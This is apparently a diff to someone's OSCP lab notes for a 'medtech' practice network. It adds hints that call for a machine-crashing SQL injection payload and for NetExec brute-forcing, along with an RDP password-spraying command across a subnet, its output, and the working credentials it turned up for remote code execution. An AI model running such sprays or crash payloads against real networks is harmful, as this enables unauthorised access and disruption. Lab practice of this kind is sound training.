@@ -1,4 +1,12 @@
 VPN, WEB01, WEB02
+
+##### Hints taken:
+```
+Make sure to check for SQL injections with a payload that will actually crash the machine
+Check *all* the user passwords and hashes and add them, even if they may not look suspicous
+use bruteforcing on NetExec, with the Userlists, Passlist and IP ranges, and use WINRM, SMB, and RDP.
+```
+
 ### Machine 1 - `.120`
 Linux, port 22, port 80.
 
@@ -178,3 +186,35 @@ Replaced the auditTracker.exe, and used
 ```
 sc.exe start audittracker
 ```
+
+
+### Yoshi creds
+```
+┌─[root@edu-virtualbox]─[/home/edu/OSCP/medtech]
+└──╼ #nxc rdp 172.16.163.0/24 -u userlist.txt -p passlist 
+RDP         172.16.163.12   3389   DEV04            [*] Windows 10 or Windows Server 2016 Build 20348 (name:DEV04) (domain:medtech.com) (nla:True)
+RDP         172.16.163.12   3389   DEV04            [-] medtech.com\leon:Flowers1 (STATUS_LOGON_FAILURE)
+RDP         172.16.163.82   3389   CLIENT01         [*] Windows 10 or Windows Server 2016 Build 22000 (name:CLIENT01) (domain:medtech.com) (nla:True)
+RDP         172.16.163.12   3389   DEV04            [-] medtech.com\mario:Flowers1 (STATUS_LOGON_FAILURE)
+RDP         172.16.163.12   3389   DEV04            [-] medtech.com\peach:Flowers1 (STATUS_LOGON_FAILURE)
+RDP         172.16.163.12   3389   DEV04            [-] medtech.com\wario:Flowers1 (STATUS_LOGON_FAILURE)
+RDP         172.16.163.12   3389   DEV04            [-] medtech.com\yoshi:Flowers1 (STATUS_LOGON_FAILURE)
+RDP         172.16.163.12   3389   DEV04            [-] medtech.com\leon:Mushroom! (STATUS_LOGON_FAILURE)
+RDP         172.16.163.12   3389   DEV04            [-] medtech.com\mario:Mushroom! (STATUS_LOGON_FAILURE)
+RDP         172.16.163.12   3389   DEV04            [-] medtech.com\peach:Mushroom! (STATUS_LOGON_FAILURE)
+RDP         172.16.163.12   3389   DEV04            [+] medtech.com\wario:Mushroom! 
+RDP         172.16.163.12   3389   DEV04            [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
+RDP         172.16.163.82   3389   CLIENT01         [-] medtech.com\leon:Flowers1 (STATUS_LOGON_FAILURE)
+RDP         172.16.163.82   3389   CLIENT01         [-] medtech.com\mario:Flowers1 (STATUS_LOGON_FAILURE)
+RDP         172.16.163.82   3389   CLIENT01         [-] medtech.com\peach:Flowers1 (STATUS_LOGON_FAILURE)
+RDP         172.16.163.82   3389   CLIENT01         [-] medtech.com\wario:Flowers1 (STATUS_LOGON_FAILURE)
+RDP         172.16.163.82   3389   CLIENT01         [-] medtech.com\yoshi:Flowers1 (STATUS_LOGON_FAILURE)
+RDP         172.16.163.82   3389   CLIENT01         [-] medtech.com\leon:Mushroom! (STATUS_LOGON_FAILURE)
+RDP         172.16.163.82   3389   CLIENT01         [-] medtech.com\mario:Mushroom! (STATUS_LOGON_FAILURE)
+RDP         172.16.163.82   3389   CLIENT01         [-] medtech.com\peach:Mushroom! (STATUS_LOGON_FAILURE)
+RDP         172.16.163.82   3389   CLIENT01         [+] medtech.com\wario:Mushroom! 
+RDP         172.16.163.82   3389   CLIENT01         [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
+Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+
+```
+RCE on: CLIENT01, DEV04 with `yoshi:Mushroom!`
